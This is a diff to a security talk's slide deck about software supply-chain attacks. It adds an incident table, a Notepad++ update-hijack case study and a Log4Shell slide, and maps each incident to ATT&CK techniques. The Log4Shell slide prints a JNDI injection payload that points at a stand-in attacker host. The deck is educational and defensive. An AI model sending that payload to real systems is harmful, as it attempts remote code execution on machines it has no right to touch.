@@ -189,7 +189,7 @@ footer: '@Chris_L_Ayers - https://chris-ayers.com'
 1. 📦 **T1195.002** — Backdoor in signed update
 2. ⚙️ **T1059** — SUNBURST DLL executes
 3. 🔐 **T1552** — Golden SAML credential theft
-4. 🕸️ **T1071** — C2 via DNS blending
+4. 🕸️ **T1071** — Command and Control (C2) via DNS blending
 5. 📤 **T1041** — Data exfil over C2 channel
 
 </div>
@@ -691,7 +691,7 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 
 # Supply Chain Compromise
 
-<!-- This is the technique that keeps security teams up at night. Why attack your code when they can attack the code you depend on? SolarWinds, Log4Shell, and the event-stream incident all showed how devastating supply chain attacks can be. -->
+<!-- This is the technique that keeps security teams up at night. Why attack your code when they can attack the code you depend on? SolarWinds, Shai-Hulud, and the event-stream incident showed how devastating supply-chain compromises can be — and Log4Shell showed how a trusted library's own critical flaw can be just as catastrophic. We'll distinguish two failure modes: supply-chain compromise versus dependency-trust failure. -->
 
 ---
 
@@ -706,15 +706,48 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 
 ---
 
-## Supply Chain Attack Examples
+## The Supply-Chain Attack Arc
 
-- **NPM**: `event-stream` (2018) - 8M downloads, Bitcoin wallet stealer
-- **NPM**: Shai Hulud worm (2025) - self-replicating via `postinstall` scripts
-- **PyPI**: Typosquatting attacks - `urllib3` vs `urllib4`  
-- **NuGet**: Dependency confusion - internal vs public packages
-- **Docker**: Compromised base images with embedded malware
+| Story | Year | Attack Pattern | Classification |
+|-------|------|----------------|----------------|
+| **event-stream** | 2018 | Maintainer handoff → poisoned `flatmap-stream` dependency | Supply-chain compromise |
+| **Shai-Hulud** | 2025 | Self-replicating npm worm via `postinstall` lifecycle hooks | Supply-chain compromise |
+| **Notepad++** | 2025 | Update infrastructure hijacked → Chrysalis backdoor | Supply-chain compromise |
+| **Axios** | 2026 | Hijacked publisher → RAT via `postinstall` hook | Supply-chain compromise |
+| **Log4Shell** | 2021 | Critical RCE in a trusted, uncompromised library | ⚠️ Dependency-trust failure |
+| **SolarWinds · XZ Utils** | 2020 · 2024 | Build pipeline compromise by nation-state actors | Nation-state supply-chain |
 
-<!-- The event-stream incident is a masterclass — a maintainer handed off a popular package to a new contributor who added a Bitcoin-stealing payload. Shai Hulud is even scarier: a proof-of-concept npm worm that propagates by hijacking publish tokens and injecting postinstall scripts into every package the compromised developer maintains. It spreads automatically — no social engineering needed after initial infection. Typosquatting creates packages with similar names hoping for typos. Dependency confusion exploits the gap between public and private registries. -->
+<!-- The arc tells a single story: your dependency graph is an attack surface at every layer. event-stream is the historical setup — a tiny trusted package became a weapon after a maintainer handoff. Shai-Hulud and Axios show the modern npm threat: install equals code execution when maintainer accounts are compromised. Notepad++ proves it isn't npm-only — developer tools and their update pipelines are targets too. Log4Shell is the other failure mode: no attacker needed, a trusted library's own flaw was enough. SolarWinds and XZ Utils are the nation-state tier — years of patience, build-pipeline access, and signed artifacts that looked entirely official. -->
+
+---
+
+## Case Study: Notepad++ Update Hijack (2025)
+
+<div class="columns">
+<div>
+
+### 🖊️ The Hijacked Update Path
+1. **Jun 2025**: Hosting infrastructure compromised
+2. Targeted users served trojanized `update.exe`
+3. Legitimate Bitdefender binary side-loaded malicious `log.dll`
+4. Shellcode decrypted → **Chrysalis** backdoor installed
+5. Cobalt Strike C2 established over HTTP
+
+</div>
+<div>
+
+### 🎯 ATT&CK Techniques
+- **T1195.002** — Update infrastructure hijacked
+- **T1036** — Masquerading as legitimate updater
+- **T1574.002** — DLL side-loading (`log.dll`)
+- **T1140** — Shellcode deobfuscation/decryption
+- **T1071.001** — C2 via HTTP/HTTPS
+- 💡 Fix: v8.8.9 enforced **signature verification**
+
+</div>
+</div>
+
+<!-- The source code was clean. The GitHub repo was clean. The problem was the update delivery channel — attacker-controlled infrastructure intercepted update traffic and served trojanized NSIS installers to selected targets. Public project disclosure put the compromise at the hosting/update-infrastructure level, not the source repository. Developer tools are privileged trust anchors: if your editor's updater is hijacked, the attacker inherits the trust of your normal daily workflow. The lesson: signed source does not mean safe delivery channel. -->
 
 ---
 
@@ -737,7 +770,7 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 - **T1195.001** — Supply chain compromise
 - **T1098** — Maintainer takeover
 - **T1027** — Obfuscation (not in git!)
-- **T1059** — RCE via SSHd · CVSS 10.0
+- **T1059** — Remote Code Execution (RCE) via SSHd · Common Vulnerability Scoring System (CVSS) 10.0
 - 💡 Caught: SSH was **500ms slower**
 
 </div>
@@ -753,7 +786,7 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 <div>
 
 ### 📦 The 3-Hour Window
-1. **Mar 31**: Maintainer account compromised via RAT malware
+1. **Mar 31**: Maintainer account compromised via Remote Access Trojan (RAT) malware
 2. `axios@1.14.1` + `axios@0.30.4` published
 3. Hidden dep: `plain-crypto-js@4.2.1`
 4. `postinstall` downloads **cross-platform RAT**
@@ -774,6 +807,36 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 </div>
 
 <!-- The Axios attack in March 2026 hit the most popular HTTP client in JavaScript — over 100 million weekly downloads. Attackers compromised a maintainer's account using social engineering and RAT malware, then published two poisoned versions. The hidden dependency ran a postinstall script that downloaded a platform-specific RAT targeting secrets on Windows, macOS, and Linux. It was live for only 3 hours but potentially exposed millions of CI/CD pipelines and dev environments. The attribution to North Korea's Sapphire Sleet group shows how nation-states target the open source supply chain. -->
+
+---
+
+## Log4Shell (2021) — Dependency-Trust Failure, Not Compromise
+
+<div class="columns">
+<div>
+
+### 🔓 CVE-2021-44228
+- **Log4j 2.0–2.14.1**: RCE via JNDI lookup injection
+- Any logged string could trigger code execution:
+  `${jndi:ldap://attacker.com/x}`
+- Transitive dependency — most teams didn't know they had it
+- CVSS 10.0 · patched in **Log4j 2.15.0**
+
+</div>
+<div>
+
+### ⚠️ Why It's a Different Failure Mode
+- Log4j maintainers were **not compromised**
+- No poisoned release, no hijacked publisher
+- A critical flaw in a **trusted, legitimate library**
+- Exposed lack of Software Bill of Materials (SBOM) visibility
+
+> The lesson: your dependency graph can betray you **even when nobody is attacking it.**
+
+</div>
+</div>
+
+<!-- Log4Shell doesn't belong in the same column as SolarWinds or event-stream. There was no malicious maintainer, no poisoned package, no hijacked build pipeline. Apache Log4j was doing exactly what it was designed to do — and that design had a critical flaw. This is the dependency-trust failure mode: you trusted the library, the library was wrong. The developer lesson: transitive dependencies can contain critical vulnerabilities you don't even know about. When Log4Shell dropped in December 2021, organizations scrambled for weeks just to answer "do we have Log4j?" With a Software Bill of Materials, that answer takes seconds, not weeks. -->
 
 ---
 
@@ -1015,7 +1078,7 @@ class ExfiltrationDetector {
 ### Phase 2: Detection
 - Anomaly detection for high-risk techniques
 - Automated response workflows
-- SIEM integration
+- Security Information and Event Management (SIEM) integration
 
 </div>
 <div>
